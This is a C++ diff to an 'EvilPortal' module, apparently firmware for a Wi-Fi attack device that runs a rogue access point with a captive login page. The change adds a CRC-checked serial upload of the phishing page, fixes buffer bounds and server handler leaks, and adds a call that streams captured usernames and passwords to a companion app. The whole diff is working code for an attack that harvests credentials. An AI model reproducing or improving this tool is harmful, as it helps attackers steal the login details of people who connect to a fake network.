@@ -1,4 +1,5 @@
 #include "EvilPortal.h"
+#include "JsonSerial.h"
 
 char apName[MAX_AP_NAME_SIZE] = "PORTAL";
 
@@ -7,6 +8,19 @@ char apName[MAX_AP_NAME_SIZE] = "PORTAL";
 #endif
 
 AsyncWebServer server(80);
+
+// CRC-32 (IEEE 802.3, poly 0xEDB88320) over a byte range. Matches the host's
+// Crc32 (and Buffer's capture-frame CRC) so the app can verify the uploaded
+// portal page byte-for-byte.
+static uint32_t ep_crc32(const uint8_t* data, size_t len) {
+  uint32_t crc = 0xFFFFFFFFu;
+  for (size_t i = 0; i < len; i++) {
+    crc ^= data[i];
+    for (int b = 0; b < 8; b++)
+      crc = (crc >> 1) ^ (0xEDB88320u & (uint32_t)(-(int32_t)(crc & 1u)));
+  }
+  return crc ^ 0xFFFFFFFFu;
+}
 
 void EvilPortal::setup() {
   this->runServer = false;
@@ -126,19 +140,57 @@ void EvilPortal::setupServer() {
   });
 }
 
-void EvilPortal::setHtmlFromSerial() {
-  Serial.println(F("Setting HTML from serial..."));
-  const char *htmlStr = Serial.readString().c_str();
+void EvilPortal::setHtmlFromSerial(int contentLength) {
+  // Bound the request to what the on-device buffer can hold.
+  if (contentLength < 0) contentLength = 0;
+  if (contentLength > MAX_HTML_SIZE - 1) contentLength = MAX_HTML_SIZE - 1;
+
   #ifdef HAS_PSRAM
-    index_html = (char*) ps_malloc(MAX_HTML_SIZE);
+    // Allocate once; cleanup() frees it. Re-using the buffer avoids the
+    // per-call leak the previous implementation had.
+    if (index_html == nullptr) index_html = (char*) ps_malloc(MAX_HTML_SIZE);
+    if (index_html == nullptr) {
+      Serial.println(F("@J {\"t\":\"portal\",\"state\":\"set\",\"ok\":false,\"err\":\"alloc\"}"));
+      return;
+    }
   #endif
-  strlcpy(index_html, htmlStr, strlen(htmlStr));
-  #ifdef HAS_PSRAM
-    index_html[MAX_HTML_SIZE - 1] = '\0';
-  #endif
-  this->has_html = true;
-  this->using_serial_html = true;
-  Serial.println("html set");
+
+  // Tell the host we are ready and how big a page the device can hold, then read
+  // EXACTLY contentLength raw bytes (no readString() timeout guessing, and no
+  // dangling pointer into a destroyed temporary String).
+  Serial.print(F("@J {\"t\":\"portal\",\"state\":\"recv\",\"max\":"));
+  Serial.print(MAX_HTML_SIZE);
+  Serial.println(F("}"));
+
+  size_t got = 0;
+  unsigned long last = millis();
+  while (got < (size_t)contentLength) {
+    int c = Serial.read();
+    if (c >= 0) {
+      index_html[got++] = (char)c;
+      last = millis();
+    } else if (millis() - last > 4000) {
+      break;               // host stalled mid-transfer: stop instead of hanging
+    } else {
+      delay(1);
+    }
+  }
+  index_html[got] = '\0';
+
+  uint32_t crc = ep_crc32((const uint8_t*)index_html, got);
+  bool ok = (got == (size_t)contentLength && got > 0);
+
+  this->has_html = (got > 0);
+  this->using_serial_html = (got > 0);
+
+  // Final confirmation: byte count + CRC-32 so the host can verify the upload.
+  Serial.print(F("@J {\"t\":\"portal\",\"state\":\"set\",\"n\":"));
+  Serial.print((uint32_t)got);
+  Serial.print(F(",\"crc\":"));
+  Serial.print(crc);
+  Serial.print(F(",\"ok\":"));
+  Serial.print(ok ? F("true") : F("false"));
+  Serial.println(F("}"));
 }
 
 bool EvilPortal::setHtml() {
@@ -177,10 +229,8 @@ bool EvilPortal::setHtml() {
     #ifdef HAS_PSRAM
       index_html = (char*) ps_malloc(MAX_HTML_SIZE);
     #endif
-    strlcpy(index_html, html.c_str(), strlen(html.c_str()));
-    #ifdef HAS_PSRAM
-      index_html[MAX_HTML_SIZE - 1] = '\0';
-    #endif
+    strlcpy(index_html, html.c_str(), MAX_HTML_SIZE);
+    index_html[MAX_HTML_SIZE - 1] = '\0';
     this->has_html = true;
     Serial.println("html set");
     html_file.close();
@@ -320,6 +370,15 @@ void EvilPortal::startAP() {
   Serial.print(F("ap ip address: "));
   Serial.println(WiFi.softAPIP());
 
+  // Start each run from a clean server: stop any previous listener and free the
+  // handlers/CaptiveRequestHandler from an earlier start. Without this, every
+  // `evilportal -c start` re-ran setupServer() + addHandler(new ...) + begin(),
+  // piling up duplicate handlers and leaking a CaptiveRequestHandler each cycle
+  // until the async server could no longer build a response (blank page /
+  // ERR_EMPTY_RESPONSE after the first run).
+  server.end();
+  server.reset();
+
   this->setupServer();
 
   this->dnsServer.start(53, "*", WiFi.softAPIP());
@@ -375,6 +434,8 @@ void EvilPortal::main(uint8_t scan_mode) {
 
     Serial.print(line);
     buffer_obj.append(line);
+    // Structured emit for JSON-mode hosts (the app's live Evil Portal screen).
+    JsonSerial::emitCred(this->user_name, this->password);
     #ifdef HAS_SCREEN
         this->sendToDisplay(line);
     #endif
